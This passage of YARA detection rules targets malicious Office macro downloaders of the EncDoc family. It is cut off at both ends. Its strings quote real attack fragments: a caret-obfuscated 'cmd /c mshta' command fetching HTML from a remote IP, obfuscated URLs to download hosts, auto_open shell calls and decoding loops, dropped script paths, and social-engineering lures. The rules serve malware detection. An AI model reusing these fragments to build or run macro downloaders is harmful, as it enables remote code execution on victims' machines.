        $x_1_1 = "h\"&\"t\"&\"t\"&\"p\"&\"s://d\"&\"ongarza.com/gJW5ma382Z/x.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"p\"&\"s://headlinepost.net/3AkrPbRj/x.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"t\"&\"p\"&\"s://produt\"&\"oratime\"&\"deelenco.com.br/9E6Y322u/x.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_4 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\"://ar\"&\"anc\"&\"al.c\"&\"o\"&\"m\"&\"/HgLCgCS3m/be.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_5 = "h\"&\"t\"&\"t\"&\"ps\"&\"://i\"&\"per\"&\"de\"&\"sk.c\"&\"o\"&\"m\"&\"/JWqj8R2nt/be.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_6 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\"://gran\"&\"dthu\"&\"m.c\"&\"o.i\"&\"n/9Z\"&\"6D\"&\"H5\"&\"h5g/b\"&\"e.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_7 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/\"&\"m\"&\"o\"&\"o\"&\"v\"&\"a\"&\"l\"&\".c\"&\"o\"&\"m\"&\".a\"&\"u\"&\"/7\"&\"Z\"&\"3\"&\"p\"&\"M\"&\"k\"&\"3\"&\"S\"&\"s/r.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_8 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/r\"&\"a\"&\"y\"&\"o\"&\"m\"&\"o\"&\"b\"&\"i\"&\"l\"&\"i\"&\"t\"&\"y\"&\".c\"&\"o\"&\"m\"&\"/b\"&\"s\"&\"F\"&\"j\"&\"d\"&\"V\"&\"p\"&\"o\"&\"T\"&\"/r.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_9 = "h\"&\"t\"&\"t\"&\"p\"&\"s:/\"&\"/a\"&\"l\"&\"l\"&\"p\"&\"i\"&\"a\"&\"n\"&\"o\"&\"t\"&\"u\"&\"n\"&\"e\"&\"r.c\"&\"o\"&\"m\"&\"/ntmtBkrN/r.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_10 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/ibssb.org/Y1jWQcAA5PF/gh.html" ascii //weight: 1
        $x_1_11 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/fuentesbrothersconcrete.com/n5Y8zD1U/gh.html" ascii //weight: 1
        $x_1_12 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"//travellerresorts.com/37EsO3nHv3YI/gh.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASY_2147798251_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASY!MTB"
        threat_id = "2147798251"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f [0-48] 2e [0-6] 2f [0-21] 2f 78 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 2f [0-64] 2e [0-16] 2f [0-32] 2f 62 65 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AJX_2147798443_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AJX!MTB"
        threat_id = "2147798443"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 22 26 22 2f 22 26 22 2f [0-64] 2e [0-37] 2f [0-64] 2f 72 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 22 26 22 2f [0-96] 2e [0-37] 2f [0-64] 2f 72 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 22 26 22 2f [0-96] 2e [0-37] 2f [0-64] 2f 72 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASO_2147798470_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASO!MTB"
        threat_id = "2147798470"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 22 26 22 2f 2f [0-64] 2e [0-48] 2f [0-80] 2f 75 22 26 22 6b 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 22 26 22 2f [0-112] 2e [0-48] 2f [0-69] 2f 75 22 26 22 6b 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 2f [0-96] 2e [0-48] 2f [0-80] 2f 75 6b 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASX_2147798514_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASX!MTB"
        threat_id = "2147798514"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f [0-64] 2e [0-8] 2f [0-32] 2f [0-18] 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 2f [0-64] 2e [0-6] 2f [0-32] 2f [0-18] 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASI_2147798545_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASI!MTB"
        threat_id = "2147798545"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 2f [0-64] 2e [0-37] 2f [0-69] 2f 75 22 26 22 69 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 2f [0-64] 2e [0-37] 2f [0-96] 2f 75 22 26 22 69 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 22 26 22 3a 2f 2f [0-101] 2e [0-37] 2f [0-69] 2f 75 22 26 22 69 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASP_2147798619_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASP!MTB"
        threat_id = "2147798619"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 22 26 22 74 22 26 22 74 22 26 22 70 [0-32] 3a 22 26 22 2f 22 26 22 2f [0-96] 22 26 22 [0-96] 2e [0-21] 2f [0-69] 2f 61 22 26 22 6c 22 26 22 74 22 26 22 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAT_2147799523_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAT!MTB"
        threat_id = "2147799523"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vb_name=\"module1\"subauto_open()de" ascii //weight: 1
        $x_1_2 = "vba.shell(ocxzw1acp+luld9qxfo+tfs1wzhrd))ends" ascii //weight: 1
        $x_1_3 = "=4to11doeventsnextjlskwaaalfyudimmrabzebipuggvaasstringmrabzebipuggva=\"4028\"e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAU_2147799618_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAU!MTB"
        threat_id = "2147799618"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "1\"subauto_open()debug.printmsgbox(chr$(69)&chr$(82)&chr$(82)&chr$(79)&chr$(82" ascii //weight: 1
        $x_1_2 = "=chr$(99)&chr$(58)&chr$(92)&chr$(119)&chr$(105)&chr$(110)&chr$(100)&chr$(111)&chr$(" ascii //weight: 1
        $x_1_3 = ".printoflbehvhudebug.print(vba.shell(vphpgrqzy+ow2iuveoa+wwhrkb94oflbehvhu+oflbehvhu))ends" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAV_2147805095_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAV!MTB"
        threat_id = "2147805095"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "1\"subauto_open()debug.printmsgbox(\"error!pleasere-installoffice\",vbokcancel);returns;1d" ascii //weight: 1
        $x_1_2 = ".shell(c5ybwe6yp+rewdh1s8d+lrpbckjpo+wj9wo1xlx))ends" ascii //weight: 1
        $x_1_3 = "uihp8)),1))xorasc(mid(pwtklvku8,j69pmuav9,1)))nextj6" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAX_2147805814_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAX!MTB"
        threat_id = "2147805814"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "vb_name=\"vbuweuw\"" ascii //weight: 1
        $x_1_2 = "vb_name=\"vnbieubtaoi4udig\"" ascii //weight: 1
        $x_1_3 = ".text=\"cwgjamd/wgjacswgjatarwgjat/wgjab\"" ascii //weight: 1
        $x_1_4 = ".textbox1.text=\"cwgjamd/wgjacswgjatarwgjat/wgjab\"" ascii //weight: 1
        $x_1_5 = {2e 74 65 78 74 3d 72 65 70 6c 61 63 65 28 [0-127] 2e 74 65 78 74 62 6f 78 34 2e 74 65 78 74 2c 22 77 67 6a 61 22 2c 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMA_2147805922_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMA!MTB"
        threat_id = "2147805922"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/87.251.86.178/pp/oo.html" ascii //weight: 1
        $x_1_2 = "cmd /c m^sh^t^a h^tt^p^:/^/87.251.86.178/pp/aa.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMA_2147805922_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMA!MTB"
        threat_id = "2147805922"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-48] 29 20 2b 20 [0-37] 20 2b 20 22 5c 04 0f 09 08 04 64 65 66 69 6e 69 74 65 6c 79 64 65 73 74 69 74 75 74 65 64 65 66 69 6e 69 74 65 64 65 65 70 2e 6c 6e 6b 22}  //weight: 2, accuracy: Low
        $x_2_2 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-48] 29 20 26 20 [0-37] 20 2b 20 22 5c (64 65 64 75 63 74 69|64 65 66 65 6e) 2e 6c 6e 6b 22}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMA_2147805922_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMA!MTB"
        threat_id = "2147805922"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\ProgramData\\JDRDQYvXSkGYYJHLYmv.vbs" ascii //weight: 1
        $x_1_2 = "C:\\ProgramData\\eWtLvPoZoqJnTDlA.vbs" ascii //weight: 1
        $x_1_3 = "C:\\ProgramData\\fKwAUNNNzNG.vbs" ascii //weight: 1
        $x_1_4 = "C:\\ProgramData\\vhAEXvmMrlyFRJysyAwQ.vbs" ascii //weight: 1
        $x_1_5 = "c:\\programdata\\ihofbnm.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSMB_2147805924_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSMB!MTB"
        threat_id = "2147805924"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "COVID-19 Funeral Assistance Helpline 844-684-6333" ascii //weight: 1
        $x_1_2 = "JJCCCJJ" ascii //weight: 1
        $x_5_3 = "C:\\ProgramData\\QBubTcDhdedXJbtyQdxhd.rtf" ascii //weight: 5
        $x_5_4 = "C:\\ProgramData\\fiqrElkWxbKTyKCaYpQKujfpVhM.rtf" ascii //weight: 5
        $x_5_5 = "C:\\ProgramData\\adTCUmIinwD.rtf" ascii //weight: 5
        $x_5_6 = "C:\\ProgramData\\GZIgCImBiMlYTgRRv" ascii //weight: 5
        $x_5_7 = "C:\\ProgramData\\qcHnKdEgKKMqIwTecvPgkQZ" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 2 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_PAAA_2147806091_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAA!MTB"
        threat_id = "2147806091"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "e=\"module1\"subauto_open()setoutlook=createobject(yocakovzt" ascii //weight: 1
        $x_1_2 = "\",\"6\")+chr(150)+yocakovzt(\"" ascii //weight: 1
        $x_1_3 = "pp6ifcpl9,1)=chr(asc(mid(dghkkkxks,pp6ifcpl9,1))-ndffecvep)nextpp6ifcpl9" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAZ_2147806215_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAZ!MTB"
        threat_id = "2147806215"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "m=o.createobject(ndjkoourc(\"''dx91\",\"qtmupw0vl\"))sets=m.exec(ndjkoourc(" ascii //weight: 1
        $x_1_2 = "ndjkoourc&chr(asc(mid(atmjr6ec6,iif(u4xggm85mmodlen(atmjr6ec6)<>0,u4xggm85mmodlen(atmjr6ec6),len(atmjr6ec6)),1))xorasc(mid(qor73kpwe,u4xggm85m,1)))" ascii //weight: 1
        $x_1_3 = "<20doevents:llaqqjgczxdzkodyasnrhaunhxdmmkpbtb=llaqqjgczxdzkodyasnrhaunhxdmmkpbtb+1loopgotocnhzwtp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SST_2147806407_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SST!MTB"
        threat_id = "2147806407"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Content.Find.Execute FindText:=\"3-\", ReplaceWith:=\"\", Replace:=2" ascii //weight: 1
        $x_1_2 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 73 28 [0-32] 2c 20 [0-32] 29 [0-3] 43 72 65 61 74 65 4f 62 6a 65 63 74 28 00 20 2b 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 63 61 74 65 67 6f 72 79 22 29 2e 56 61 6c 75 65 29 2e 65 78 65 63 20 22 63 3a 5c 77 69 6e 64 6f 77 73 5c 65 78 70 6c 6f 72 65 72 20 22 20 2b 20 01 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 73 63 72 69 70 74 22 [0-3] 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 54 72 69 6d 28 22 77 22 20 2b 20 [0-22] 20 2b 20 22 2e 22 29 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SST_2147806407_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SST!MTB"
        threat_id = "2147806407"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4d 73 67 42 6f 78 20 22 65 72 72 3a 20 [0-15] 20 63 6f 72 72 75 70 74 65 64}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 68 65 78 32 61 73 63 69 69 28 68 65 78 32 61 73 63 69 69 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 57 6f 72 64 73 28 [0-4] 29 29 29 29 2e 52 75 6e 20 22 72 75 6e 64 6c 6c 33 32 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 31 2e (78|6d 73 74) 22 20 2b 20 22 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 69 6e 74 20 23 46 69 6c 65 4e 75 6d 2c 20 68 65 78 32 61 73 63 69 69 28 68 65 78 32 61 73 63 69 69 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 57 6f 72 64 73 28 [0-3] 29 29 29 20 2b 20 68 65 78 32 61 73 63 69 69 28 68 65 78 32 61 73 63 69 69 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 57 6f 72 64 73 28 [0-3] 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {6e 75 6d 20 3d 20 4d 69 64 28 54 65 78 74 54 6f 46 69 6c 65 2c 20 79 2c 20 32 29 [0-7] 56 61 6c 75 65 20 3d 20 56 61 6c 75 65 20 2b 20 43 68 72 28 56 61 6c 28 22 26 68 22 20 26 20 6e 75 6d 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAB_2147807245_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAB!MTB"
        threat_id = "2147807245"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".content.find.executefindtext:=\"3-\",replacewith:=\"\",replace:=2" ascii //weight: 1
        $x_1_2 = "cfunctions(nextdoorkarol,liketubeload)c" ascii //weight: 1
        $x_1_3 = "es(\"category\").value).exec\"c:\\windows\\explorer\"+l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ESM_2147807364_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ESM!MTB"
        threat_id = "2147807364"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "SSDGO" ascii //weight: 1
        $x_3_2 = {63 6d 64 20 2f 63 20 6d [0-1] 73 [0-1] 68 [0-1] 74 [0-1] 61 20 68 [0-1] 74 [0-1] 74 [0-1] 70 [0-1] 3a 2f [0-1] 2f 38 37 2e 32 35 31 2e 38 36 2e 31 37 38 2f [0-15] 2f [0-15] 2e 68 74 6d 6c}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAC_2147807409_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAC!MTB"
        threat_id = "2147807409"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "vb_name=\"mdulo1\"p" ascii //weight: 1
        $x_1_2 = {2f 64 6f 77 6e 6c 6f 61 64 2f 78 75 6e 6f 69 74 78 76 79 65 79 71 22 29 29 [0-63] 2e 73 61 76 65 74 6f 66 69 6c 65 22 78 2e 76 62 73 22 2c 32}  //weight: 1, accuracy: Low
        $x_1_3 = {62 38 30 76 22 29 29 [0-63] 2e 73 61 76 65 74 6f 66 69 6c 65 22 78 2e 76 62 73 22 2c 32}  //weight: 1, accuracy: Low
        $x_1_4 = "t.shell\").run\"x.vbs\",0,falseends" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAAD_2147807737_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAAD!MTB"
        threat_id = "2147807737"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "vb_name=\"module1\"submachine()" ascii //weight: 1
        $x_1_2 = {76 61 6c 75 65 26 72 61 6e 67 65 28 22 [0-127] 22 29 2e 76 61 6c 75 65 26 72 61 6e 67 65 28 22 [0-127] 22 29 2e 76 61 6c 75 65 66 69 6c 65 6f 75 74 2e 77 72 69 74 65 73 74 72 74 65 78 74 66 69 6c 65 6f 75 74 2e 63}  //weight: 1, accuracy: Low
